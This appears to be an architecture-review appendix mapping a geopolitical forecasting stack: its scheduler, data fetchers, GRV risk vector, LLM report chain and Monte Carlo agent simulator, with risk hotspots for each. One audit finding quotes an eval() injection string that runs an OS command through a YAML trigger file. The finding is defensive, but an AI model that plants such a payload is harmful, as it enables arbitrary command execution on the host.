> 结论：玉衡"代码就绪但闭环空转"、瑶光"监控口径错位致空转无告警"、天权"数据科学前置缺位"三者**互为因果**，共同构成本系统"预测→验证→反馈"科学闭环尚未真正跑通的现状。Track B 规划建议（同目录 `roadmap-recommendations-20260815.md`）针对此给出 P0 收尾路径。

---

## 附录 A：各子系统架构地图（Wave 0 精简产出）

以下为建图波次产出的结构化地图，供逐条发现的上下文参照。

### macro-scan (天枢·数据观测层) — S:\world-sim\macro-scan\核心代码

**入口点**

  - 核心代码/scheduler.py — main()：容器启动入口，替代 crontab 守护进程，无限循环 30s tick，Popen 后台 spawn 所有任务
  - 核心代码/run_macro_analysis.py — CLI 入口（--country --depth --topic --force），被 scheduler morning/us_daily/china_daily 任务调用
  - 核心代码/scan_weak_signals.py — 独立进程，每6小时触发，同步 GDELT + FRED Z-score + RSS 关键词扫描
  - 核心代码/geo_risk_vector.py — main()：独立进程，06:10 触发，输出 grv_latest.json + grv_history.jsonl
  - 核心代码/web_server.py — HTTP 仪表盘服务器（对外暴露 GRV/报告/信号数据）
  - 核心代码/control_server.py — 运控 API（暂停/恢复调度任务，读写 control_pause.json + scheduler_state.json）

**关键模块**

  - {"file": "核心代码/scheduler.py", "role": "Python cron 守护进程（取代 crontab，绕开 seccomp/fork 限制）。定义 57 条 JOBS（含 4 条 weak_signal 时间槽，2 条 reports_index），支持固定时刻（HHMM）和间隔触发（I5/I15/I30/I60/I120）。Popen 非阻塞后台 spawn，每 60s 落盘 scheduler_state.json（DATA_DIR=/workspace/data 持久卷），读 control_pause.json 支持运控暂停单任务。启动时调用 startup_checks.run_all_checks(strict=True) 校验 source_dimension_map 完整性。"}
  - {"file": "核心代码/geo_risk_vector.py", "role": "GRV 向量聚合器（06:10 触发）。读取 gdelt_scores.json + fred_history/GPR*.csv，计算 13 个标准维度（台海/中美/俄欧/中东/全球等）+ 4 个推导维度（南海/朝鲜半岛/印太/全球南方）。归一化公式：GPR 用滚动10年 P10-P95，GDELT 用 gdelt_calib.json 动态 P95（样本<100 时 fallback 硬编码）。接入 WTI 油价补强 middle_east_energy（三信号：GDELT×0.45 + WTI×0.40 + Channel_B_bonus×0.15），GED v26.1 月度冲突死亡数补强 russia_europe。输出 data/grv_latest.json + data/grv_history.jsonl（原子写）。"}
  - {"file": "核心代码/weight_matrix.py", "role": "玉衡权重基础设施。管理 config/grv_weights.yaml（信源→预测目标→权重矩阵）。从 config/prior.yaml 初始化。双层 clip：变化速率 ±25% + 绝对值 [0.05, 5.0]。月度健康检查：Herfindahl 集中度、有效信源数（>0.1 权重）、全局参与率（<30% 告警）。待审批队列：data/pending_weight_adjustments.json，玉衡审批后调用 apply_weight_adjustment 写回，异步推 ntfy。"}
  - {"file": "核心代码/run_macro_analysis.py", "role": "LLM 分析报告主流程（8步管道）。Step1 FRED+AkShare 指标快照 → Step2 衰退/通胀评分（LEI加权） → Step3 历史危机情景匹配（CSV 欧几里德距离） → Step4 RAG 检索（pgvector 优先，TF-IDF fallback） → Step5 体制检测+蒙特卡洛（5000路径/12月） → Step6 构建 prompt（注入 GRV 矩阵/反馈回路/LEI/跨国溢出） → Step7 hybrid_llm 调用（SiliconFlow→MiMo→纯数据降级） → Step8 保存报告（MD + ntfy 推送 + 知识库回纳）。幂等锁（.lock文件+PID检查），支持 --country us/china/both + --depth quick/standard/deep。"}
  - {"file": "核心代码/scan_weak_signals.py", "role": "弱信号扫描器（每6小时 00:00/06:00/12:00/18:00）。从本地 fred_history/*.csv 计算 FRED 指标 Z-score（窗口默认24，日频指标60-90），阈值 ZSCORE_WARN/ALERT 触发预警。同步拉 GDELT DOC 2.0 国别军事/制裁分数写入 gdelt_scores.json。新闻关键词扫描走 news_db（RSS/defense_rss 源）。输出 data/latest_news.json（预警详情含 trigger_titles）+ data/gdelt_scores.json。"}
  - {"file": "核心代码/pg_read.py", "role": "只读 PostgreSQL 访问层（E0-C）。连接 worldsim-pg，用户 worldsim_app（密码从 WORLDSIM_APP_PW 环境变量）。search_path=news,forecast,tianji,public。_Row 行工厂：同时支持列名下标和索引下标，datetime→UTC文本/Decimal→float/bool→int 边界归一化，与 SQLite row 行为完全兼容。每次调用新建连接（不缓存）。失败返回 None（调用方负责降级）。"}
  - {"file": "核心代码/news_db.py", "role": "新闻库持久化（N1）。维护 news.db（SQLite WAL模式），表：scan_contexts/articles/article_categories/signal_episodes/episode_articles/signal_outcomes/synthesis_log。url 或 content_hash 去重。E0-A 旁路双写 PG（pg_write_collection，异常自吞）。支持 WORLDSIM_SQLITE_OFF=1 PG-only 模式（严禁创建 SQLite，08-14 P0修复）。90天滚动窗口裁剪（月度 news_prune 任务）。"}
  - {"file": "核心代码/hybrid_llm.py", "role": "混合 LLM 调用层。降级链：SiliconFlow（Qwen/Qwen3.5-27B） → MiniMax-M3 → Claude（Anthropic API） → 空字符串（触发 run_macro_analysis._make_fallback_section 纯数据报告）。通过 SILICONFLOW_API_KEY/MINIMAX_API_KEY/ANTHROPIC_API_KEY 环境变量注入。"}
  - {"file": "核心代码/fetch_gpr.py", "role": "GPR 地缘政治风险指数下载器。从 matteoiacoviello.com 下载 XLS（7个系列：GPR/GPRA/GPRT/GPRC_USA/CHN/TWN/RUS），解析 year/month 两列或 date 字符串列，写 data/fred_history/{series_id}.csv（与 FRED 同格式）。超时300s（官网服务器慢）。"}
  - {"file": "核心代码/fetcher_base.py", "role": "新数据源通用适配基类。能力：固定间隔自限速、统一重试+指数退避（429/5xx 重试；4xx 不重试）、失败降级（不抛）、as-of 时间戳、JSON 原子写（.tmp+os.replace）、契约版本化（_schema_version）、保留良值（load_previous_good）。RetryOnMissingMixin：日档缺失时进程内自动重试（3次，间隔600s）。所有 fetch_*.py 的父类。"}
  - {"file": "核心代码/optim_config.py", "role": "全局单点配置。定义 WORKSPACE（来自 OPENCLAW_WORKSPACE 环境变量）、DATA_DIR=/workspace/data、FRED_API_KEY、PREDICTIONS_LOG、WEAK_SIGNAL_LOG、Z-score 阈值、AUTH_GATEWAY_PORT、PROXY_URL 等。跨容器契约 §6.4：DATA_DIR 路径为所有模块的单一事实源，禁止各模块用 dirname(__file__) 自行推导。"}
  - {"file": "核心代码/data_fetcher.py", "role": "数据获取层（Layer A）。封装 FRED API 调用（get_fred_latest/get_fred_with_yoy）、代理自动检测（连续403超阈值切换 NAS 代理）、缓存管理、萨姆规则计算、中国指标 AkShare 解析、get_current_snapshot/get_china_current_snapshot。被 run_macro_analysis.py 导入。"}
  - {"file": "核心代码/daily_narrative.py", "role": "天玑叙事预处理（07:00 触发，依赖 grv_update 06:10 + situation_detect 06:30）。读 GRV 向量、弱信号日志，生成叙事块写入持久化层。"}
  - {"file": "核心代码/situation_detector.py", "role": "情势检测器（06:30 触发，依赖 scan_weak_signals 06:00）。聚合 GRV + 弱信号 → 情势级别判断（normal/stress/crisis）。"}
  - {"file": "核心代码/pg_write_collection.py", "role": "PG 写镜像层（E0-A 旁路双写）。为 news_db.py 提供 upsert_news_article/scan_context/signal_episode 等接口，异步写入 worldsim-pg。"}

**数据流**

  外部 API 采集层:
  fetch_fred_history.py → data/fred_history/*.csv（FRED 全序列）
  fetch_gpr.py → data/fred_history/GPR*.csv（GPR 7个系列，同格式）
  fetch_gdelt_geo.py（I15）→ data/news_geo.jsonl + news_geo.json
  scan_weak_signals.py（弱信号兼 GDELT 调用）→ data/gdelt_scores.json + data/latest_news.json
  fetch_rss_news.py / fetch_defense_rss.py → news_db.py（SQLite + PG 双写）
  fetch_commodity_yahoo.py → data/commodity_yahoo.json
  fetch_earthquake.py → data/earthquake_risk.json
  fetch_disaster_signals.py → data/disaster_signals.json
  fetch_climate_signals.py → data/climate_signals.json
  fetch_sanctions.py → data/sanctions_risk.json
  fetch_energy.py / fetch_energy_eia.py → data/energy_risk.json
  fetch_china_data.py / fetch_china_data_akshare.py → data/china_*.csv
  fetch_world_macro.py → data/world_macro.json

GRV 计算层（06:10）:
  data/gdelt_scores.json + data/fred_history/GPR*.csv
  + data/commodity_yahoo.json（WTI oil）
  + data/climate_signals.json + data/disaster_signals.json
  + data/sanctions_risk.json + data/earthquake_risk.json
  + data/ged/ged_agg_country_month.csv（GED v26.1）
  + pg_read.connect()（conflict floor 查 news.articles）
  → geo_risk_vector.py → data/grv_latest.json + data/grv_history.jsonl
  → grv_threshold.check_and_trigger()（B线 ntfy 阈值告警）

叙事/情势层（06:30 → 07:00）:
  GRV + gdelt_scores + latest_news.json
  → situation_detector.py → 情势级别
  → daily_narrative.py → narrative_processor.py → PG synthesis_log

LLM 报告层（07:30/20:00/20:15）:
  data_fetcher.get_current_snapshot()（FRED API + 缓存）
  + data/latest_news.json（弱信号预警注入）
  + data/grv_latest.json（GRV 矩阵注入）
  + rag_engine.rag_query()（pgvector/TF-IDF RAG）
  + mc_engine.run_china_monte_carlo()（5000路径）
  → run_macro_analysis.generate_report()（prompt 构建）
  → hybrid_llm.reason()（SiliconFlow→MiMo→Claude）
  → docs/分析报告/*.md + ntfy 推送 + 知识库/07_分析报告/ 回纳

权重反馈层（每月1日）:
  verify_hypothesis.py（--commit --update-weights）
  → weight_matrix.apply_weight_adjustment()
  → config/grv_weights.yaml（双层 clip 约束）
  → tianji_db.log_weight_update()

持久化双轨:
  SQLite（data/news.db / tianji.db）← 旧路径，PG-only 时禁用
  PostgreSQL worldsim-pg（news.* / forecast.* / tianji.*）← 新路径
  pg_read.py（只读，worldsim_app）/ pg_write_collection.py（写镜像）

**外部依赖**

  - FRED API (api.stlouisfed.org) — 美国宏观指标全序列，需 FRED_API_KEY
  - GPR XLS (matteoiacoviello.com) — 地缘政治风险指数，7个国别系列，无 key
  - GDELT DOC 2.0 API (api.gdeltproject.org) — 全球事件军事/制裁分数，无 key
  - AkShare — 中国宏观/中观指标，需 pip install akshare
  - CoinGecko API — 加密货币价格，需 COINGECKO_API_KEY（免费档 100 RPM）
  - Binance/Kraken REST API — 加密行情冗余源（fetch_crypto_extra），公共端点无 key
  - Yahoo Finance — 商品/股市快照（fetch_commodity_yahoo），yfinance 库
  - OpenSanctions bulk data (data.opensanctions.org) — 制裁目标 CSV，无 key
  - USGS Earthquake API (earthquake.usgs.gov) — 实时地震 GeoJSON，无 key
  - NY Fed GSCPI CSV (newyorkfed.org) — 全球供应链压力指数，无 key
  - HDX (data.humdata.org) — 人道主义危机数据，无 key
  - FAO (fao.org) — 粮食价格指数，月度，无 key
  - OpenSky Network API — 航空流量，限速 200 req/day（免费）
  - Next Spaceflight API — 发射事件记录
  - Space-Track.org — 卫星统计，需账户
  - KiwiSDR 目录 — SDR 网络目录，无 key
  - NASA FIRMS — 全球火点热点，需 MAP_KEY
  - UK Carbon Intensity API (api.carbonintensity.org.uk) — 电网碳强度，无 key
  - SiliconFlow API (api.siliconflow.cn) — LLM 主力后端（Qwen3.5-27B），需 SILICONFLOW_API_KEY
  - Anthropic Claude API — LLM 备用后端，需 ANTHROPIC_API_KEY
  - MiniMax API (api.minimaxi.com) — LLM 第二备用（MiniMax-M3），需 MINIMAX_API_KEY
  - ntfy.sh — 推送通知（报告/阈值告警/健康检查），无 key（公共 topic）
  - PostgreSQL worldsim-pg:5432 — 持久化主库，需 WORLDSIM_APP_PW 环境变量
  - NAS 出口代理 (192.168.31.108:7890) — 部分外部源直连不可达时走此（PROXY_URL）

**风险热点**

  - {"file": "核心代码/scheduler.py", "area": "last_ok=True 基于 spawn 成功而非进程退出", "why": "Popen 非阻塞，scheduler 不等子进程完成。last_ok=True 只代表 fork 成功，不代表任务成功执行。scheduler_state.json 中的 last_ok 字段对运控面板有误导风险。DATA_DIR 断言强制要求 /workspace/data（否则 fail-loud 退出），但重启后 last_run_ts 恢复依赖 state 文件，若容器崩溃时文件写一半会导致恢复失败。"}
  - {"file": "核心代码/geo_risk_vector.py", "area": "GDELT 全零信号静默风险 + GED 数据过期退化", "why": "GDELT 采集失败时 gdelt_scores.json 可能返回全0（_gdelt_country_score 打 warning 但不阻断），导致 GRV 向量虚低。GED 数据冻结到 2024 年末，超 18 个月未更新则 GED 权重自动退化为 0（影响 russia_europe/middle_east_energy 精度）。gdelt_calib.json 样本<100 时回退硬编码 P95，而硬编码值随时间漂移失效。"}
  - {"file": "核心代码/news_db.py", "area": "SQLite↔PG 双写过渡期完整性风险", "why": "WORLDSIM_SQLITE_OFF=1 模式下严禁 sqlite3.connect（init_db/prune 直接 return），但历史代码中任何直接 import sqlite3 并 connect 的路径都会静默复活 news.db（08-14 P0 修复了 scan_weak_signals 路径，但其他调用方需逐一审查）。PG 写镜像（pg_write_collection）异常自吞，写失败不回滚 SQLite——双写不一致时以 PG 为准，但无告警。"}
  - {"file": "核心代码/pg_read.py", "area": "WORLDSIM_APP_PW 缺失时全链路静默降级", "why": "connect() 在密码未注入时返回 None，调用方（news_db.get_trigger_titles/geo_risk_vector._apply_conflict_floor 等）收到 None 后直接跳过，不产生任何告警。生产环境密码轮换或注入失败会导致多个依赖 PG 读的模块静默使用空数据，而非报错。"}
  - {"file": "核心代码/weight_matrix.py", "area": "PyYAML 依赖缺失时静默退化为 JSON", "why": "HAS_YAML=False 时 _load_yaml 返回空字典（所有权重读取返回默认值 0.10），_save_yaml 写 .json 而非 .yaml。GRV 下游若依赖 grv_weights.yaml 中的自定义权重，将全部退化为均等权重，且没有日志告警。月度健康检查通过 ntfy 推送，但 NTFY_URL 可能未配置。"}
  - {"file": "核心代码/hybrid_llm.py", "area": "全链路 LLM 失败时报告质量骤降", "why": "SiliconFlow→MiMo→Claude 三级均失败时返回空字符串，run_macro_analysis 触发 _make_fallback_section（纯 Python 数据表格，无叙事分析）。该降级报告同样走 ntfy 推送，接收方无法区分 LLM 报告与降级报告的质量差异（仅 [降级] 标签区分）。"}
  - {"file": "核心代码/run_macro_analysis.py", "area": "中国 LPR 硬编码近似值（C6 货币政策分析）", "why": "evaluate_feedback_loops_china() 中 cn_lpr_approx 从 indicators.get('cn_lpr') 读取，若该指标未拉取则 fallback 3.10（写死注释说明为 2026-05 值）。LPR 变动后若指标缺失，泰勒规则偏差计算将持续基于过期值，影响 C6 回路判断。同类问题：cn_10y_approx=1.65 也是硬编码近似值。"}

**备注**

  调度任务总数：scheduler.py 的 JOBS 列表实际包含 57 条 entry（含 4 条 weak_signal 时间槽、2 条 reports_index 时间槽），唯一 job_name 约 50 个。任务说明中提到的"49个"可能是某个历史版本的计数。

数据库迁移状态（E0-C）：系统正处于 SQLite → PostgreSQL 迁移中期。WORLDSIM_SQLITE_OFF=1 时 PG-only，写路径走 pg_write_collection.py，读路径走 pg_read.py；标志位未设时双写（SQLite 主 + PG 镜像）。两条路径并行维护，是当前最大的架构复杂度来源。

GRV 维度置信度：推导维度（south_china_sea/korean_peninsula/india_pacific/global_south）因 GDELT 国别覆盖不完整，confidence 值均在 0.30–0.49 之间，设计上已标注 missing 国家列表，供下游消费者判断可信度。

日志目录：所有任务日志写 /var/log/macro-scan/（容器内），不落持久卷，重启丢失。scheduler_state.json 落 /workspace/data（持久卷）。

已退场组件：crucix 新闻源（08-12 退场）、Ollama LLM（CF-8 废弃，变量保留向后兼容）、news_geo_feed.py NER 管线（08-11 停调度，由 gdelt_geo --incremental 路线 A 直接派生 news_geo.json 替代）。

### macro-sim (天璇 simulation engine)

**入口点**

  - run.py --daemon: polls /app/macro_data/sim_trigger.json every 60s, auto-runs full simulation on non-empty trigger file
  - run.py --run: manually triggers one full simulation (calibrate 50 steps + predict 24 steps × 100 MC runs)
  - run.py --predict-only: skips calibration, runs prediction with default agent params (fast test)
  - core/calibrator.py:run_calibration(): called by run_full_simulation; also usable standalone for parameter tuning diagnostics
  - core/bifurcation.py:run_prediction(): MC prediction loop, callable independently with pre-calibrated agent params

**关键模块**

  - {"file": "S:/world-sim/macro-sim/run.py:27", "role": "Top-level orchestrator: run_full_simulation() sequences calibration → world load → prediction → _write_report (Markdown) → _archive_to_tianji (forecast_tracker.db) → _send_ntfy. Also defines _archive_to_tianji() at line 497 which writes predictions + reasoning_trace rows to SQLite."}
  - {"file": "S:/world-sim/macro-sim/core/simulation.py:419", "role": "MacroSimModel: central simulation dispatcher. step() runs Phase 1 (agent decisions via decide_with_decision), Phase 2 (gm_resolve_rules delta aggregation), _apply_delta, apply_natural_decay, apply_bleed_rules, board_decay_step. Maintains action_history deque (info_delay lookback) and decision_trace list."}
  - {"file": "S:/world-sim/macro-sim/core/simulation.py:31", "role": "load_agents(): factory from agents.yaml using importlib dynamic class loading. Loads soul YAML files when soul_file is set, injects soul dict into each agent. Returns (agents_dict, global_cfg)."}
  - {"file": "S:/world-sim/macro-sim/core/simulation.py:84", "role": "gm_resolve_rules(): maps all 17 agents actions to per-agent delta dicts, then applies transmission matrix (per_agent_delta × coeff × attenuation=0.5 global). Contains SovereignAgent branch (line 301) that writes grv_dimensions directly at 0-100 scale, bypassing the [0,1] clamp. Positive feedback loops at lines 388-412 mutate activation_prob and forced_activate in place."}
  - {"file": "S:/world-sim/macro-sim/core/bifurcation.py:339", "role": "run_prediction(): Monte Carlo core. Runs 100 iterations: _add_initial_noise (line 71) → MacroSimModel.run(24 steps) → validate_run_actions. Then _detect_bifurcation (line 120, bimodal std test on GRV series) → _cluster_runs (line 146, natural-break k-means on final sentiment or GRV) → _extract_key_events (line 183, events >40% frequency) → _generate_narrative (line 276, GLM-Z1-9B call). Returns list[PathResult]."}
  - {"file": "S:/world-sim/macro-sim/core/bifurcation.py:71", "role": "_add_initial_noise(): adds Gaussian noise to 10 endogenous vars and 5 exogenous vars (GRV ±8pt, credit_spread ±15bp, VIX derived) per MC run seed. Creates path diversity by perturbing the starting world state."}
  - {"file": "S:/world-sim/macro-sim/core/calibrator.py:1156", "role": "run_calibration(): 50-step Teacher Forcing loop. Per step: inject exogenous vars, extract pre-clamp sim_delta via _extract_preclamp_delta(), compute _derive_endogenous_targets() soft targets, trigger LLM param adjustment when per-variable relative error > RELATIVE_TRIGGER. Maintains 7-day calibration cache (CACHE_VERSION=14). Runs three hard guards (check_guards line 509) before returning."}
  - {"file": "S:/world-sim/macro-sim/core/calibrator.py:616", "role": "run_probe(): diagnostic probe that runs 50 steps with frozen params to measure delta-error distribution (m_v, consistency_rate, silence_frac, act_frac per variable). Also runs EASE directed probe (_run_ease_probe line 985) as a two-level ship gate. Writes calib_probe.json."}
  - {"file": "S:/world-sim/macro-sim/core/world_state.py:17", "role": "MacroWorldState dataclass: central state object. Exogenous fields (vix, grv, t10y2y, credit_spread, dff, grv_dimensions dict) come from macro-scan; endogenous fields (market_sentiment, bank_credit_tightening, liquidity_premium, etc.) evolve during simulation. get_agent_context() at line 82 builds role-specific ctx dict injected into each agent's decide call."}
  - {"file": "S:/world-sim/macro-sim/core/world_state.py:280", "role": "apply_bleed_rules(): 6 bleed rules: (1) sentiment collapse → VIX rise, (2) energy supply risk → grv_energy rise, (3) credit tightening → credit_spread widening, (4) em_capital_outflow → yield curve inversion, (5) yen_carry_risk → VIX jump (capped at vix_yen_carry_bleed_max=17), (6) retail_panic → sentiment drag."}
  - {"file": "S:/world-sim/macro-sim/core/world_state.py:358", "role": "load_monthly_history(): reads grv_history.jsonl (JSONL, first entry per YYYY-MM month) and FRED CSVs (T10Y2Y, BAA10Y, DFF, ECBDFR, DEXCHUS). Applies 3-month moving average smoothing to GRV dimensions. Returns calibration data sequence."}
  - {"file": "S:/world-sim/macro-sim/core/world_state.py:537", "role": "load_from_macro_scan(): loads current world state from grv_latest.json (strict schema v1.0 check), FRED CSVs (latest value), news_export.json, daily_digest.json, situations.yaml (escalating events), slow_variables.json (IRP/UCRI/GCI). This is the prediction start point."}
  - {"file": "S:/world-sim/macro-sim/core/agents/base.py:151", "role": "MacroAgent base dataclass: defines agent_id, role, info_delay, activation_prob, params (AgentParams), transmission_coefficients, soul dict, activation_countdown, forced_activate. decide_with_decision() at line 197 routes to LLM, _decide_soul (line 233), or _decide_rules legacy fallback."}
  - {"file": "S:/world-sim/macro-sim/core/agents/base.py:91", "role": "_eval_trigger(): parses soul YAML trigger expressions via Python eval(). Supports AND/OR/numeric comparisons. Has missing_strategy param (optimistic/conservative/neutral) controlling behavior when ctx variables are absent. Called by _decide_soul for red_line_triggers and faction triggers."}
  - {"file": "S:/world-sim/macro-sim/core/agents/financial.py:23", "role": "Financial agents A1-A12 (excluding A4/A7/A8): FedAgent (A1, delay=4), CommercialBankAgent (A2, delay=1, has ease_cooldown state), HedgeFundAgent (A3, delay=0, OVERSOLD_BOUNCE_PROB=0.45), InstitutionAgent (A5, delay=2, SAFE_HAVEN_PROB=0.35), USTreasuryAgent (A9), ECBAgent (A11), BOJAgent (A12, magnitude=1.5)."}
  - {"file": "S:/world-sim/macro-sim/core/agents/geopolitical.py:11", "role": "Geopolitical agents: EnergyGovAgent (A4, legacy, suspended via activation_prob=0 in agents.yaml), EMCentralBankAgent (A7, delay=3), ChinaPBOCAgent (A8, delay=3, checks usd_cny > 7.3 for intervention)."}
  - {"file": "S:/world-sim/macro-sim/core/agents/social.py:11", "role": "Social agents: MediaAgent (A6, delay=1, activation=0.80, has HOLD guard when sentiment < -0.5 to prevent floor pinning), RetailAgent (A10, delay=0, activation=0.90, sensitivity=1.2, magnitude=0.8)."}
  - {"file": "S:/world-sim/macro-sim/core/agents/sovereign.py:82", "role": "SovereignAgent base class for S1_usa/S2_china/S3_eu/S4_russia/S5_saudi. Decision logic delegated to MacroAgent._decide_soul(). Contains BOARD module-level singleton at line 29. EnergyGovSovereignAgent (line 208) is A4-replacement class used by S5_saudi."}
  - {"file": "S:/world-sim/macro-sim/core/board_baseline.py:34", "role": "Board relation matrix: 6 sovereign-pair relations (strategic_rivalry, sanctions_conflict, energy_standoff, opec_cooperation, security_pact, energy_imports). Module-level _baseline and _board_cur dicts. derive_board_baseline() sets baseline from GRV. board_push_all() called by gm_resolve_rules per sovereign action. board_decay_step() called per simulation step."}
  - {"file": "S:/world-sim/macro-sim/core/llm_client.py:77", "role": "call_llm(): OpenAI-compatible client. Default model GLM-Z1-9B (Silicon Flow, calibration param adjustment + consistency check). Narrative generation uses Qwen3.5-27B (SILICONFLOW_MODEL_QWEN_LARGE). API key from SILICONFLOW_API_KEY env or /vol2/1000/software/macro-scan/key.txt. max_tokens=256, temperature=0.4."}
  - {"file": "S:/world-sim/macro-sim/core/consistency_validator.py:53", "role": "validate_step_actions(): Layer 1 static rule table (7 same-agent direction conflicts + 3 US-mechanism rules). Layer 2 LLM check disabled in MC runs (use_llm=False). Runs post-run via validate_run_actions(); issues tagged on last history snapshot as _consistency_issues."}
  - {"file": "S:/world-sim/macro-sim/config/agents.yaml:1", "role": "17-agent configuration: A1-A12 (A4 suspended activation_prob=0) plus S1_usa/S2_china/S3_eu/S4_russia/S5_saudi. Defines class path, info_delay, activation_prob, soul_file, transmission_coefficients, params (sensitivity/threshold/magnitude). global.transmission_attenuation=0.5."}
  - {"file": "S:/world-sim/macro-sim/souls/", "role": "8 soul YAML files: A1_fed.yaml, A1_usa.yaml, A2_china.yaml, A3_eu.yaml, A3_hedge_fund.yaml, A6_media.yaml, S4_russia.yaml, S5_saudi.yaml. Each contains doctrine, red_lines, red_line_triggers (eval expressions), internal_factions (weight/trigger/bias_actions), grv_impact_map, resources/internal_state."}

**数据流**

  External inputs: grv_latest.json (11-dim GRV from macro-scan/天枢) + FRED CSVs (T10Y2Y/BAA10Y/DFF/SP500/DEXJPUS/DEXCHUS/ECBDFR) + grv_history.jsonl (monthly history) + news_export.json + situations.yaml + slow_variables.json → load_from_macro_scan / load_monthly_history → MacroWorldState.

CALIBRATION PATH (50 steps): MacroWorldState(history[0]) → MacroSimModel.step(inject_world=exogenous_vars)[Teacher Forcing] → snapshot["delta"] → _extract_preclamp_delta (sentiment×MONTHLY_SCALE=0.25, others raw) → sim_delta. Paired with _derive_endogenous_targets(prev_row, curr_row): market_sentiment target = -grv_signal×0.5, bank_credit_tightening target = cs_signal×0.6, liquidity_premium target = cs_signal×0.4 + t10y2y_signal×0.3. Per-variable relative error |sim_delta - target| / |target| > RELATIVE_TRIGGER (0.5, self-adjusting via calib_tuning_state.json) → _call_llm_for_adjustment(GLM-Z1-9B) → JSON array of {agent, param, new} instructions → agents[id].apply_param_adjustment(). Writes calibration_log.jsonl (append). After 50 steps: check_guards (A: act_frac≥30% per var, B: <2 writers collapsed, C: 5≤param_changes≤50) → calibration_cache.json (7-day, version=14) → returns calibrated_agent_params dict.

PREDICTION PATH (100 MC × 24 steps): load_agents fresh + apply calibrated params → for run_i in 0..99: random.seed(run_i), _add_initial_noise (Gaussian on 10 endogenous + GRV/spread/VIX exogenous) → copy.deepcopy(agents_template) → MacroSimModel.run(24 free steps). Each step: (1) agents decide via decide_with_decision (soul→red_line→faction_weights×boost→weighted_sample→bias_action, or legacy if-else), using visible_actions from action_history deque at info_delay offset; (2) gm_resolve_rules → per-agent delta (A1-A12 hardcoded branches + SovereignAgent grv_dimensions direct write) + transmission matrix (src_delta × coeff × 0.5 × tgt_magnitude) + positive feedback (consecutive_negative_steps≥3 → A7/A12 forced_activate); (3) _apply_delta (sentiment×0.25 scale, em_capital_outflow/bank_credit/liquidity_premium clamp[-1,1], others clamp[0,1]); (4) apply_natural_decay (sentiment×0.995, bank_credit×0.97, etc., VIX→baseline 80/20 mean reversion); (5) apply_bleed_rules (6 rules); (6) board_decay_step (×0.95 toward baseline). validate_run_actions per run (consistency check, tagged on last snapshot). Post-loop: _detect_bifurcation (std>2.0 + bimodal 15% threshold on GRV series) → _cluster_runs (natural-break on final sentiment if std>0.15 else final GRV) → 2-3 PathResult objects → _extract_key_events (>40% frequency, max 8) → _generate_narrative (GLM-Z1-9B, 256 tokens) → list[PathResult] sorted by probability desc.

OUTPUT: _write_report → /app/reports/YYYY-MM-DD_HH-MM_演化_L{level}_校准{score}.md. _archive_to_tianji → forecast_tracker.db: INSERT INTO predictions (grv_direction, quarterly horizon) + INSERT INTO reasoning_trace (causal_chains from key_events[:5]). _send_ntfy → ntfy.sh/***REMOVED***.

**外部依赖**

  - forecast_tracker.db (SQLite WAL, at TIANJI_DB_PATH=/app/macro_data/forecast_tracker.db): tables predictions + reasoning_trace. Written after every prediction run via _archive_to_tianji().
  - /app/macro_data/grv_history.jsonl: monthly GRV history (JSONL), produced by macro-scan/天枢. Calibration reads last 56 months. First entry per YYYY-MM month used (later intra-month updates silently ignored).
  - /app/macro_data/grv_latest.json: current GRV snapshot with 11+ dimensions (global_composite, taiwan_strait, russia_europe, us_china_strategic, middle_east_energy, sanctions_risk, etc.). Schema version must be 1.0 exactly or simulation halts.
  - /app/macro_data/fred_history/: CSV files T10Y2Y.csv, BAA10Y.csv, DFF.csv, SP500.csv, DEXJPUS.csv, DEXCHUS.csv, ECBDFR.csv from FRED. Both calibration and prediction read these.
  - /app/macro_data/news_export.json + daily_digest.json + situations.yaml: news headlines and escalating geopolitical situations injected as trigger_event and recent_news into world state.
  - /app/macro_data/slow_variables.json: monthly IRP/UCRI/GCI slow variables (Sprint-2 feature).
  - /app/macro_data/sim_trigger.json: daemon trigger file. Non-empty JSON with level+event fields starts a simulation run; file is cleared (written empty) immediately after reading.
  - Silicon Flow API (https://api.siliconflow.cn/v1): GLM-Z1-9B (THUDM/GLM-Z1-9B-0414) for calibration LLM param adjustment and consistency Layer 2 check. Qwen3.5-27B for narrative generation. Key from SILICONFLOW_API_KEY env or /vol2/1000/software/macro-scan/key.txt.
  - ntfy.sh/***REMOVED***: push notification endpoint for simulation completion summary.
  - /workspace/data/static/military_backdrop.md: SIPRI military background injected into narrative generation prompts.
  - /app/data/calibration_cache.json: 7-day calibration result cache (CACHE_VERSION=14). Stale or version-mismatched cache triggers full 50-step re-calibration.
  - /app/data/calib_probe.json + calib_tuning_state.json: probe diagnostics and adaptive trigger threshold state.
  - /app/output/calibration_log.jsonl: append-only log of every LLM param adjustment.

**风险热点**

  - {"file": "S:/world-sim/macro-sim/core/board_baseline.py:30", "area": "Board global state bleeds across Monte Carlo runs", "why": "_baseline and _board_cur are module-level singletons. derive_board_baseline() is called once before the 100-run MC loop (bifurcation.py:354), but board_decay_step() (simulation.py:516) and board_push_all() (simulation.py:356) mutate _board_cur on every step of every run. There is no reset between runs. The 5 sovereign agents (S1-S5, activation_prob=0.35) each push board intensity per action; by run 50+ the board state has drifted far from the GRV-derived baseline. Later runs experience systematically higher/lower sovereign tension regardless of their initial noise seed, corrupting the independence assumption of the MC sample."}
  - {"file": "S:/world-sim/macro-sim/core/agents/base.py:91", "area": "eval() on YAML-defined soul trigger strings", "why": "_eval_trigger() substitutes ctx variables into the trigger string and calls eval(). The regex r'\\b([a-zA-Z_][a-zA-Z0-9_]*)\\b' only replaces known numeric ctx keys; it does not block Python builtins or dunder attributes. A soul YAML file containing a trigger like '__import__(\"os\").system(\"cmd\")' would execute. The comment at line 146 claims 'no injection risk' which is incorrect for externally writable soul files. Low severity in a closed NAS deployment but worth noting."}
  - {"file": "S:/world-sim/macro-sim/core/calibrator.py:1180", "area": "Calibration cache invalidation gap for agents.yaml changes", "why": "The 7-day calibration cache at /app/data/calibration_cache.json is keyed only on CACHE_VERSION (integer, manually bumped in code) + timestamp age. Changes to agents.yaml (activation_prob, info_delay, soul_file additions, new transmission_coefficients) are not detected. If agents.yaml is modified while the cache is fresh, run_calibration() returns the stale cached params silently with a log message 'hit cache', and the prediction runs with parameters tuned for the old engine configuration. The CACHE_VERSION bump protocol (documented at lines 114-138) must be followed manually by developers."}
